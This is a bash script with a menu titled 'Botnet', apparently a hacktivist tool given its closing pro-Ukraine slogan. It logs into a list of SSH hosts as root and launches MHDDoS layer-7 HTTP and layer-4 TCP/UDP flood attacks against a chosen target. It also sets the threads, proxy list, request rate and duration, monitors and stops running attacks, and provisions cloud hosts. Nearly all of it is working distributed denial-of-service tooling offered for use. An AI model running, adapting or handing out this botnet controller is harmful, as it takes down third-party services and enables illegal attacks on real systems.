#!/bin/bash

SCRIPT=$(readlink -f "$0")
SCRIPTPATH=$(dirname "$SCRIPT")
SCRIPTNAME="$0"

cd $SCRIPTPATH
git fetch

[[ -n $(git diff --name-only origin/master | grep $SCRIPTNAME) ]] && {
    echo "Found a new version of me, updating myself..."
    git checkout master
    git pull --force
    echo "Running the new version..."
    exec "$SCRIPTNAME"

    # Now exit this old instance
    exit 1
}
echo "Already the latest version."


SCRIPT_DIR=$(dirname "$0")
export SCRIPT_DIR
touch -a "$SCRIPT_DIR/hosts.txt"
export DIALOGRC="$SCRIPT_DIR/.dialogrc"

while : ; do
    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Before the start populate your hosts.txt file!" 15 55 8  1 'Botnet attack on host' 2 'Bandwidth monitoring' 3 'Show current attacks' 4 'Stop all botnet attacks' 5 'Stop certain host/ip attack in botnet' 6 'Setup SSH hosts' 7 'Cloud providers' 8 'Exit')

    case $MENU_OPTION in

    1) #Botnet attack on host
        MENU_OPTION=$(dialog --title 'Attack type' --menu --stdout "Choose option:" 15 55 2 1 'L7 Attack - HTTP protocol' 2 'L4 Attack - TCP/UPD protocol' 3 'Back')

        case $MENU_OPTION in

        1)
            ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l7.sh")
            TARGET=$(bash "${SCRIPT_DIR}/menus/url.sh")
            SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
            THREADS=$(bash "${SCRIPT_DIR}/menus/threads.sh")
            PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")
            RPS=$(bash "${SCRIPT_DIR}/menus/rps.sh")
            DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")

            clear
            printf "Starting L7 attack...\n"
            bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $SOCKS_TYPE $THREADS $PROXY_FILE $RPS $DURATION" --hostsfile "$SCRIPT_DIR/hosts.txt"

            break
            ;;

        2)
            ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l4.sh")
            TARGET=$(bash "${SCRIPT_DIR}/menus/url.sh")
            THREADS=$(bash "${SCRIPT_DIR}/menus/threads.sh")
            DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")
            SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
            PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")

            clear
            printf "Starting L4 attack...\n"
            bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $THREADS $DURATION $SOCKS_TYPE $PROXY_FILE" --hostsfile "$SCRIPT_DIR/hosts.txt"

            break
            ;;


        3)
            continue
            ;;

        esac
        ;;
        
    2) #Bandwidth monitoring
        count=0
        while read -r host
        do
          options+=($((++count)) "$host")
        done < "$SCRIPT_DIR/hosts.txt"

        MENU_OPTION=$(dialog --title 'Bandwidth monitoring' --menu --stdout "Choose host to monitor:" 15 55 ${#options[@]} "${options[@]}")
        HOST=${options[$MENU_OPTION*2-1]}

        ssh -t "root@$HOST" 'python3 MHDDoS/start.py TOOLS'
        break
        ;;

    3) #Show current attacks
        echo "Loading..."
        while read -r host
        do
            processes=$(ssh -n "root@$host" "ps -aux | grep start.py | grep -v grep | grep -vi screen" | awk '{print $13, $14}' | sed 's/^/    /')
            output+="$host\n$processes\n\n"
        done < "$SCRIPT_DIR/hosts.txt"
        printf "$output" > "$SCRIPT_DIR/output.txt"
        dialog --title "Hosts and their active attacks" --textbox "$SCRIPT_DIR/output.txt" 30 50

        break
        ;;

    4) #Stop all botnet attacks
        bash "$SCRIPT_DIR/runoverssh" root "killall screen" --hostsfile "$SCRIPT_DIR/hosts.txt"
        break
        ;;


    5) #Stop certain host/ip attack in botnet
        TARGET=$(bash "${SCRIPT_DIR}/menus/url.sh")
        bash "$SCRIPT_DIR/runoverssh" root "pkill -f '$TARGET'" --hostsfile "$SCRIPT_DIR/hosts.txt"

        break
        ;;

    6) #Setup SSH hosts
        bash "$SCRIPT_DIR/setup_hosts.sh"

        break
        ;;

    7)
        MENU_OPTION=$(dialog --title 'Cloud providers' --menu --stdout "Choose option:" 15 55 2 1 'Digital Ocean' 2 'Back')
        case $MENU_OPTION in

            1)
                bash "$SCRIPT_DIR/cloud_providers/digital_ocean.sh"
                continue
                ;;
            2)
                continue
                ;;

        esac

        break
        ;;

    8)
        break
        ;;

    esac
done

printf "\nInvaders must die! Slava Ukraini!\n"

